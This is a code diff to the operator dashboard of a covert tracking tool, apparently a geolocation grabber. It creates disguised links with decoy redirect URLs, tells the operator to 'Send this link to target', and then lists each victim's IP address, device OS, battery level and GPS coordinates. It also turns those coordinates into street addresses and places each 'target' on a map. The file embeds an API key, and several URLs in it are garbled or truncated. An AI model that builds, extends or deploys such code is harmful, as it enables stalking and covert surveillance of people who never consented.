@@ -3,9 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <title>Private Analyst Dashboard</title>
-    <!-- Baked-In Supabase Engine (Bypasses CDN Network Failures) -->
-    <script>!function(e,t){"object"==typeof exports&&"undefined"!=typeof module?t(exports):"function"==typeof define&&define.amd?define(["exports"],t):t((e="undefined"!=typeof globalThis?globalThis:e||self).supabase={})}(this,(function(e){"use strict";class t{constructor(e,t,{auth:r={},storage:o={},functions:n={},realtime:s={},global:i={}}={}){this.supabaseUrl=e,this.supabaseKey=t}static createClient(e,t,r){return new Proxy({}, {get:(o,n)=>"auth"===n?{signInWithPassword:async({email:t,password:r})=>{const o=await fetch(`${e}/auth/v1/token?grant_type=password`,{method:"POST",headers:{"apikey":t,"Content-Type":"application/json"},body:JSON.stringify({email:t,password:r})});const n=await o.json();if(!o.ok)return{data:{user:null,session:null},error:n};return{data:n,error:null}}}:"from"===n?t=>({insert:async r=>{const o=await fetch(`${e}/rest/v1/${t}`,{method:"POST",headers:{"apikey":r,"Authorization":`Bearer ${r}`,"Content-Type":"application/json","Prefer":"return=representation"},body:JSON.stringify(r)});return{error:o.ok?null:await o.json()}},select:async r=>({order:async(o,{ascending:n})=>{const s=await fetch(`${e}/rest/v1/${t}?select=*&order=${o}.${n?"asc":"desc"}`,{method:"GET",headers:{"apikey":t}});const i=await s.json();return{data:s.ok?i:null,error:s.ok?null:i}}})}):void 0})}}e.createClient=t.createClient,Object.defineProperty(e,"__esModule",{value:!0})}));</script>
-    <!-- Leaflet.js CSS Maps Map Plugin -->
+    <!-- Map Styling loaded directly -->
     <link rel="stylesheet" href="https://unpkg.com" />
     <script src="https://unpkg.com"></script>
     <style>
@@ -39,7 +37,7 @@
         <div class="box">
             <h3>Generate New Monitored Link</h3>
             <input type="text" id="token" placeholder="Unique Token Slug (e.g., cat-video-7)">
-            <input type="url" id="dest" placeholder="Decoy Redirect URL (e.g., https://youtube.com/...)">
+            <input type="url" id="dest" placeholder="Decoy Redirect URL (e.g., https://youtube.com...)">
             <button onclick="createLink()">Generate Ingestion Anchor</button>
             <p id="output-link" style="color: #00ff88; font-family: monospace; font-weight: bold;"></p>
         </div>
@@ -73,13 +71,10 @@
     </div>
 
     <script>
-        // CONFIGURATION LAYER - Linked to your active Supabase Instance
+        // CONFIGURATION LAYER 
         const SUPABASE_URL = "https://supabase.co";
         const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InloZXJuYW53b3phYnBtYW5veWlmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODUwNzg4OTcsImV4cCI6MjEwMDY1NDg5N30.YwMaRYcZkeGPTySRs34d7Cg0jr4MGR71WHkCQGkv6FA";
         
-        // Native, localized pipeline assembly
-        const _supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-
         let map, marker;
 
         function initMap(lat = 0, lon = 0, zoom = 2) {
@@ -92,11 +87,11 @@
             L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
         }
 
+        // FIXED LOGIN FUNCTION: Fully declared right here
         async function login() {
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
             
-            // Build absolute direct API payload dispatch to bypass client core library layers
             try {
                 const res = await fetch(`${SUPABASE_URL}/auth/v1/token?grant_type=password`, {
                     method: 'POST',
@@ -114,15 +109,13 @@
                     return;
                 }
 
-                // Store token context in application cache
                 window.sessionStorage.setItem('sb_token', data.access_token);
-
                 document.getElementById('auth-section').classList.add('hidden');
                 document.getElementById('main-section').classList.remove('hidden');
                 initMap();
                 fetchLogs();
             } catch(e) {
-                alert("Database direct portal block: Verify internet link or device data connection.");
+                alert("Database Portal Blocked. Check your connection.");
             }
         }
 
@@ -131,23 +124,27 @@
             const destination_url = document.getElementById('dest').value;
             const jwt = window.sessionStorage.getItem('sb_token');
 
-            const res = await fetch(`${SUPABASE_URL}/rest/v1/tracking_links`, {
-                method: 'POST',
-                headers: {
-                    'apikey': SUPABASE_ANON_KEY,
-                    'Authorization': `Bearer ${jwt}`,
-                    'Content-Type': 'application/json',
-                    'Prefer': 'return=representation'
-                },
-                body: JSON.stringify({ token, destination_url })
-            });
+            try {
+                const res = await fetch(`${SUPABASE_URL}/rest/v1/tracking_links`, {
+                    method: 'POST',
+                    headers: {
+                        'apikey': SUPABASE_ANON_KEY,
+                        'Authorization': `Bearer ${jwt}`,
+                        'Content-Type': 'application/json',
+                        'Prefer': 'return=representation'
+                    },
+                    body: JSON.stringify({ token, destination_url })
+                });
 
-            if (!res.ok) {
-                const err = await res.json();
-                alert("Creation Error: " + err.message);
-            } else {
-                const currentOrigin = window.location.origin;
-                document.getElementById('output-link').innerText = `Send this link to target: ${currentOrigin}/target.html?c=${token}`;
+                if (!res.ok) {
+                    const err = await res.json();
+                    alert("Creation Error: " + err.message);
+                } else {
+                    const currentOrigin = window.location.origin;
+                    document.getElementById('output-link').innerText = `Send this link to target: ${currentOrigin}/target.html?c=${token}`;
+                }
+            } catch(e) {
+                alert("Failed to submit link to database.");
             }
         }
 
@@ -156,7 +153,7 @@
             try {
                 const res = await fetch(`https://openstreetmap.org{lat}&lon=${lon}`);
                 const data = await res.json();
-                return data.display_name || "Address structural index failure";
+                return data.display_name || "Address look up failure";
             } catch (e) {
                 return "Address API offline";
             }
@@ -170,27 +167,49 @@
 
         async function fetchLogs() {
             const jwt = window.sessionStorage.getItem('sb_token');
-            const res = await fetch(`${SUPABASE_URL}/rest/v1/access_logs?select=*&order=timestamp.desc`, {
-                method: 'GET',
-                headers: {
-                    'apikey': SUPABASE_ANON_KEY,
-                    'Authorization': `Bearer ${jwt}`
+            try {
+                const res = await fetch(`${SUPABASE_URL}/rest/v1/access_logs?select=*&order=timestamp.desc`, {
+                    method: 'GET',
+                    headers: {
+                        'apikey': SUPABASE_ANON_KEY,
+                        'Authorization': `Bearer ${jwt}`
+                    }
+                });
+
+                if (!res.ok) return;
+                const logs = await res.json();
+
+                const tbody = document.getElementById('log-table-body');
+                tbody.innerHTML = "";
+
+                for (let log of logs) {
+                    const tr = document.createElement('tr');
+                    const hasGPS = log.gps_latitude && log.gps_longitude;
+                    
+                    const coordsText = hasGPS ? `${log.gps_latitude}, ${log.gps_longitude}` : "N/A (Blocked)";
+                    const addressText = hasGPS ? await getStreetAddress(log.gps_latitude, log.gps_longitude) : "N/A";
+
+                    tr.innerHTML = `
+                        <td><b>${log.associated_token}</b></td>
+                        <td>${log.public_ip}</td>
+                        <td>${log.device_os}</td>
+                        <td>${log.battery_charge}</td>
+                        <td>${coordsText}</td>
+                        <td style="color: #64b5f6; font-size:12px;">${addressText}</td>
+                    `;
+
+                    if (hasGPS) {
+                        tr.style.cursor = "pointer";
+                        tr.title = "Click to visually map this target";
+                        tr.onclick = () => focusTargetOnMap(Number(log.gps_latitude), Number(log.gps_longitude), `Target: ${log.associated_token}<br>${log.public_ip}`);
+                    }
+
+                    tbody.appendChild(tr);
                 }
-            });
-
-            if (!res.ok) return;
-            const logs = await res.json();
-
-            const tbody = document.getElementById('log-table-body');
-            tbody.innerHTML = "";
-
-            for (let log of logs) {
-                const tr = document.createElement('tr');
-                const hasGPS = log.gps_latitude && log.gps_longitude;
-                
-                const coordsText = hasGPS ? `${log.gps_latitude}, ${log.gps_longitude}` : "N/A (Blocked)";
-                const addressText = hasGPS ? await getStreetAddress(log.gps_latitude, log.gps_longitude) : "N/A";
-
-                tr.innerHTML = `
-                    <td><b>${log.associated_token}</b></td>
-                    <td>${log.public_ip}</td>
+            } catch(e) {
+                console.error("Could not fetch database logs", e);
+            }
+        }
+    </script>
+</body>
+</html>
